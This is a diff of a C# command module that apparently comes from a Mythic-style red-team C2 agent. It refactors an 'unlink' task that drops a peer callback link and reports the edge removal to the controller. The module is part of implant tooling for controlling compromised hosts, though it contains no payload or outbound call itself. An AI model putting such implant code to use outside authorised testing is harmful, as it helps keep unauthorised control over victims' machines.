@@ -32,42 +32,36 @@ namespace Tasks
         {
         }
 
-        public override void Kill()
-        {
-            base.Kill();
-        }
 
-        public override ST.Task CreateTasking()
+        public override void Start()
         {
-            return new ST.Task(() =>
+            TaskResponse resp;
+            UnlinkParameters parameters = _jsonSerializer.Deserialize<UnlinkParameters>(_data.Parameters);
+
+            if (_agent.GetPeerManager().Remove(parameters.ConnectionInfo.CallbackUUID))
             {
-                TaskResponse resp;
-                UnlinkParameters parameters = _jsonSerializer.Deserialize<UnlinkParameters>(_data.Parameters);
-                
-                if (_agent.GetPeerManager().Remove(parameters.ConnectionInfo.CallbackUUID))
+                resp = CreateTaskResponse($"Unlinked {parameters.ConnectionInfo.Hostname}", true, "completed", new IMythicMessage[]
                 {
-                    resp = CreateTaskResponse($"Unlinked {parameters.ConnectionInfo.Hostname}", true, "completed", new IMythicMessage[]
+                    new EdgeNode()
                     {
-                        new EdgeNode()
-                        {
-                            Source =  _agent.GetUUID(),
-                            Destination = parameters.ConnectionInfo.CallbackUUID,
-                            Direction = EdgeDirection.SourceToDestination,
-                            Action = "remove",
-                            C2Profile = parameters.ConnectionInfo.C2Profile.Name,
-                            MetaData = ""
-                        }, 
-                    });
-                }
-                else
-                {
-                    resp = CreateTaskResponse($"Failed to unlink {parameters.ConnectionInfo.Hostname}", true, "error");
-                }
-                // Your code here..
-                // // CreateTaskResponse to create a new TaskResposne object
-                // // Then add response to queue
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-            }, _cancellationToken.Token);
+                        Source = _agent.GetUUID(),
+                        Destination = parameters.ConnectionInfo.CallbackUUID,
+                        Direction = EdgeDirection.SourceToDestination,
+                        Action = "remove",
+                        C2Profile = parameters.ConnectionInfo.C2Profile.Name,
+                        MetaData = ""
+                    },
+                });
+            }
+            else
+            {
+                resp = CreateTaskResponse($"Failed to unlink {parameters.ConnectionInfo.Hostname}", true, "error");
+            }
+
+            // Your code here..
+            // // CreateTaskResponse to create a new TaskResponse object
+            // // Then add response to queue
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
     }
 }
